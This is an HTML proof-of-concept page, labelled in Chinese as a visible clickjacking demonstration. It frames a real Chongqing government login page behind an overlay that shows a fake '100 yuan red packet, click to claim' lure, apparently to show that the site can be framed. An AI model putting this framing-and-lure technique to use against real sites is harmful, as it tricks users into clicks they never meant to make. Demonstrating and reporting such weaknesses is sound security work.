<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>点击劫持漏洞演示（可见版）</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            height: 100vh;
            background: #f5f5f5;
        }

        /* 伪装层：放在目标页面前面，挡住大部分内容 */
        .overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.9);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 10;
        }

        /* 中间的红包按钮 */
        .red-packet {
            width: 200px;
            height: 280px;
            background: linear-gradient(135deg, #ff4d4f, #ff7875);
            border-radius: 16px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            box-shadow: 0 8px 20px rgba(255, 77, 79, 0.3);
            cursor: pointer;
        }

        .red-packet .text {
            color: white;
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 10px;
        }

        .red-packet .subtext {
            color: #fff;
            font-size: 14px;
            opacity: 0.9;
        }

        /* 目标登录页面：非透明，放在后面 */
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
        }
    </style>
</head>
<body>
    <!-- 真实可见的目标登录页 -->
    <iframe src="https://ywt.scjgj.cq.gov.cn/login"></iframe>

    <!-- 伪装层和红包按钮 -->
    <div class="overlay">
        <div class="red-packet">
            <div class="text">100元红包</div>
            <div class="subtext">点击领取</div>
        </div>
    </div>
</body>
</html>
